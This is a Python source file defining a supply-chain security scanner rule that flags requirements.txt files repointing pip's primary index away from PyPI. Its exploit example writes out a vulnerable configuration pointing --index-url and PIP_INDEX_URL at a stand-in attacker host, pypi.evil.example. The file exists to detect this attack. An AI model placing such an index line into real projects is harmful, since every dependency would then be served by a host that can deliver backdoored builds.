"""PYPI-016, primary --index-url repointed at a non-PyPI host."""
from __future__ import annotations

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import RequirementsFile, get_option_values

RULE = Rule(
    id="PYPI-016",
    title="requirements.txt repoints the primary index at a non-PyPI host",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-3",),
    esf=("ESF-S-TRUSTED-REG", "ESF-S-VERIFY-DEPS"),
    cwe=("CWE-829", "CWE-494"),
    recommendation=(
        "Point ``--index-url`` / ``-i`` at canonical PyPI "
        "(``https://pypi.org/simple``) or at a vetted internal mirror "
        "that proxies PyPI. ``--index-url`` (and the ``PIP_INDEX_URL`` "
        "environment form) replaces the default index outright, so "
        "every package, direct and transitive, is resolved from that "
        "one host. If the host is attacker-controlled or compromised, "
        "the whole dependency tree is served by it. Keep the chosen "
        "index under change control and pin every requirement with "
        "``==`` (PYPI-001) and a ``--hash`` (PYPI-002) so a swapped "
        "index cannot silently change the bytes."
    ),
    docs_note=(
        "Fires on a top-level ``--index-url`` / ``-i`` whose host is "
        "not ``pypi.org`` / ``files.pythonhosted.org``. PYPI-005 flags "
        "only the additive ``--extra-index-url``; this rule catches "
        "the substitutive vector, which is the more dangerous one "
        "because there is no PyPI source left to compare against.\n\n"
        "Plain-HTTP index URLs are also PYPI-003 and inline-credential "
        "URLs are also PYPI-010; this rule is specifically about the "
        "primary index host being repointed at all. Hosts that look "
        "like internal mirrors (``*.internal``, ``*.corp``, "
        "``*.local``, ``*.intra``, ``*.lan``, ``localhost``, an "
        "``artifactory`` / ``nexus`` / ``devpi`` host, or a bare "
        "hostname with no dot) are treated as known false positives "
        "and skipped."
    ),
    known_fp=(
        "A legitimate corporate mirror or proxy is the intended "
        "index. The internal-mirror heuristic skips the common shapes "
        "(``pypi.internal``, ``artifactory.corp/...``, ``*.local`` / "
        "``*.intra`` / ``*.lan`` hosts, ``localhost``, single-label "
        "hostnames). For a cloud-hosted private index that does not "
        "match the heuristic, suppress per file once the host is "
        "verified.",
    ),
    exploit_example=(
        "# Vulnerable: the default index is replaced wholesale. pip\n"
        "# resolves EVERY package, direct and transitive, from this\n"
        "# one host, so its operator can serve a backdoored build of\n"
        "# any dependency it chooses. The same effect comes from\n"
        "# exporting ``PIP_INDEX_URL=https://pypi.evil.example/simple``\n"
        "# in the CI environment.\n"
        "# requirements.txt\n"
        "--index-url https://pypi.evil.example/simple\n"
        "requests==2.31.0\n"
        "\n"
        "# Safe: keep the primary index on canonical PyPI (or a\n"
        "# vetted internal mirror that proxies PyPI under change\n"
        "# control), and pin + hash every requirement.\n"
        "# requirements.txt\n"
        "--index-url https://pypi.org/simple\n"
        "--require-hashes\n"
        "requests==2.31.0 \\\n"
        "    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1"
    ),
)


_PYPI_HOSTS: tuple[str, ...] = ("pypi.org", "files.pythonhosted.org")
#: Substrings / suffixes that mark a host as a deliberate internal
#: mirror, the common legitimate use of a repointed primary index.
_INTERNAL_SUFFIXES: tuple[str, ...] = (
    ".internal", ".corp", ".local", ".intra", ".lan", ".internal.",
)
_INTERNAL_TOKENS: tuple[str, ...] = (
    "artifactory", "nexus", "devpi", "internal", "corp",
)


def _host_of(url: str) -> str:
    """Return the lowercase host of a URL, or ``""``."""
    rest = url.split("://", 1)[1] if "://" in url else url
    authority = rest.split("/", 1)[0]
    authority = authority.rsplit("@", 1)[-1]
    return authority.split(":", 1)[0].lower()


def _is_pypi_host(host: str) -> bool:
    return host in _PYPI_HOSTS or host.endswith(".pythonhosted.org")


def _is_internal_mirror(host: str) -> bool:
    if host in ("localhost", "127.0.0.1", "::1"):
        return True
    if "." not in host:
        # Single-label hostname (``pypi-mirror``), only resolvable on
        # an internal network.
        return True
    if host.endswith(_INTERNAL_SUFFIXES):
        return True
    return any(tok in host for tok in _INTERNAL_TOKENS)


def check(rf: RequirementsFile) -> Finding:
    offenders: list[str] = []
    locations: list[Location] = []
    for flag in ("--index-url", "-i"):
        for value in get_option_values(rf, flag):
            value = value.strip()
            if not value:
                continue
            host = _host_of(value)
            if not host or _is_pypi_host(host):
                continue
            if _is_internal_mirror(host):
                continue
            offenders.append(f"{flag} {value}")
            line_no = 1
            if flag in rf.text:
                line_no = rf.text[:rf.text.index(flag)].count("\n") + 1
            locations.append(Location(
                path=rf.path, start_line=line_no, end_line=line_no,
            ))
    passed = not offenders
    desc = (
        "Primary --index-url points at PyPI or a recognized internal "
        "mirror."
        if passed else
        f"{len(offenders)} primary index option(s) repointed at a "
        f"non-PyPI host: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. pip resolves every "
        f"package, direct and transitive, from that one host."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=rf.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
